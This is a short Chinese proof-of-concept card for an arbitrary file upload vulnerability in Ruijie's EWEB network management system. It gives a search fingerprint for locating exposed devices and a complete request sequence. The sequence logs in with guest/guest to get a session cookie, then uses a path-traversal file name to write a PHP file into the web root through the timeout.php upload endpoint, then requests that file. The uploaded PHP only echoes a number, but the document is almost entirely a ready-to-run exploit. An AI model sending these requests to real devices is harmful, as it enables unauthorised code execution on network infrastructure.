# 锐捷网络-EWEB网管系统timeout存在任意文件上传漏洞

- **系统**：锐捷　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="锐捷网络-EWEB网管系统"`
- **请求**：`POST /ddi/server/login.php HTTP/1.1`

**请求体 / payload**
```
获取可用cookie
Host:
Content-Length: 30
Content-Type: application/x-www-form-urlencoded
username=guest&password=guest?
利用可用cookie带入上传接口
POST /system_pi/timeout.php?a=upload HTTP/1.1
Host:
Content-Length: 62
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=jftm33hn1crv2sehrdd79rjv36; path=/; HttpOnly;
X-Requested-With: XMLHttpRequest
fileName=../tmp/html/112233.php&mes=<?php echo 1234567891011;?>
访问文件
GET /112233.php HTTP/1.1
Host:
Cookie: RUIJIEID=jftm33hn1crv2sehrdd79rjv36
```
- **预期**：200　|　—